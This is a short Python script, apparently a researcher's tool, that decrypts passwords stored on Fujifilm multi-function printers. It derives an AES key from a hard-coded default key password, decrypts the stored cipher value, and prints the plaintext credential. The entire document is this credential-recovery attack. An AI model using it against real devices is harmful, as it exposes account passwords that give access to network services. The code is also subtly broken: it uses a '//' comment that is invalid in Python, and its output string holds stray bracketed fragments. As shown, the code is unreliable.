#!/usr/bin/env python
# Decrypt Fujifilm Multi-function Printer credentials
# Ceri Coburn (https://github.com/CCob) @_EthicalChaos_

import base64
from Cryptodome.Util import Padding
from Cryptodome.Cipher import AES
from Cryptodome.Hash import MD5
from Cryptodome.Hash import SHA1

keyPassword = b'11111' //or b''
encData = base64.b64decode('[CipherValue]')
sha1 = SHA1.new()
sha1.update(keyPassword)
sha1Key = sha1.digest()

keyName = base64.b64encode(sha1Key)
iv = encData[0:16]
encBlob = encData[16:]

md5 = MD5.new()
md5.update(sha1Key)
aesKey = md5.digest()

ivAes = AES.new(aesKey, AES.MODE_ECB)
decryptedIv = ivAes.decrypt(iv)

print("Calculated Key Name: %s\nAES[KT1] [DL2]  Key: %s\nDecrypted IV: %s" % (keyName, aesKey.hex(), decryptedIv.hex()))
aes = AES.new(aesKey, AES.MODE_CBC, decryptedIv)
decryptedPassword = Padding.unpad(aes.decrypt(encBlob), len(aesKey))
print("Decrypted Password: %s" % str(decryptedPassword, 'utf-8'))